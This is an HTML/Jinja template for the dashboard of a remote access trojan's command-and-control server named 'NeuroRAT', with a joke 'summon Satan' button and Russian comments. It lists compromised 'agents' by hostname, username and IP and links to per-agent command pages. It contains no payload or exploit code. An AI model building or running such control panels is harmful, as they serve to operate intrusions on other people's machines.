{% extends "shared/base_layout.html" %}

{% block title %}NeuroRAT C2 Dashboard{% endblock %}

{% block content %}
<div class="card">
    <h2>Server Status</h2>
    <p>Uptime: {{uptime}}</p>
    <p>Connected Agents: {{connected_agents}}</p>
    <p>Total Agents: {{total_agents}}</p>
</div>

<div class="card">
    <h2>Connected Agents</h2>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>OS</th>
                <th>Hostname</th>
                <th>Username</th>
                <th>IP Address</th>
                <th>Status</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            {% for agent in agents %}
            <tr>
                <td>{{agent.agent_id}}</td>
                <td>{{agent.os}}</td>
                <td>{{agent.hostname}}</td>
                <td>{{agent.username}}</td>
                <td>{{agent.ip_address}}</td>
                <td class="status-{{agent.status}}">{{agent.status}}</td>
                <td>
                    <a href="/api/agent/{{agent.agent_id}}/chat" class="btn">Chat</a>
                    <a href="/agent/{{agent.agent_id}}/command" class="btn">Command</a>
                </td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</div>

<div class="card">
    <h2>Recent Events</h2>
    <table>
        <thead>
            <tr>
                <th>Time</th>
                <th>Event Type</th>
                <th>Agent</th>
                <th>Details</th>
            </tr>
        </thead>
        <tbody>
            {% for event in events %}
            <tr>
                <td>{{event.timestamp}}</td>
                <td>{{event.event_type}}</td>
                <td>{{event.agent_id or "System"}}</td>
                <td>{{event.details}}</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</div>

<!-- Кнопка вызова сатаны -->
<button class="satan-btn" id="summonSatan">ВЫЗВАТЬ САТАНУ</button>

<!-- Модальное окно с ASCII-артом сатаны -->
<div id="satanModal" class="modal">
    <div class="modal-content">
        <span class="close-modal">&times;</span>
        <h2 class="satan-text">САТАНА ПРИЗВАН!</h2>
        <pre class="satan-text">{{satan_ascii|safe}}</pre>
        <p class="satan-text">Ваша программа теперь проклята и работает на 666% быстрее</p>
    </div>
</div>
{% endblock %}

{% block scripts %}
<script>
    // Refresh data every 30 seconds
    setTimeout(() => {
        window.location.reload();
    }, 30000);
    
    // Модальное окно с сатаной
    const modal = document.getElementById("satanModal");
    const btn = document.getElementById("summonSatan");
    const span = document.getElementsByClassName("close-modal")[0];
    
    // Открыть модальное окно при клике на кнопку
    btn.onclick = function() {
        modal.style.display = "block";
        // Добавляем звуковой эффект (демонический смех)
        playDemonicSound();
    }
    
    // Закрыть модальное окно при клике на крестик
    span.onclick = function() {
        modal.style.display = "none";
    }
    
    // Закрыть модальное окно при клике вне его
    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
    
    // Функция для звукового эффекта
    function playDemonicSound() {
        // Здесь мог бы быть код для проигрывания звука
        console.log("Демонический смех звучит в вашем воображении");
    }
</script>
{% endblock %}

{% block extra_styles %}
@keyframes flicker {
    0% { opacity: 1; }
    5% { opacity: 0.8; }
    10% { opacity: 1; }
    15% { opacity: 0.9; }
    20% { opacity: 1; }
    25% { opacity: 0.9; }
    30% { opacity: 1; }
    35% { opacity: 0.8; }
    40% { opacity: 1; }
    50% { opacity: 0.7; }
    60% { opacity: 1; }
    70% { opacity: 0.9; }
    80% { opacity: 1; }
    90% { opacity: 0.8; }
    100% { opacity: 1; }
}

.satan-text {
    animation: flicker 5s infinite;
    color: #ff3300;
    text-shadow: 0 0 10px #ff0000;
}
{% endblock %}
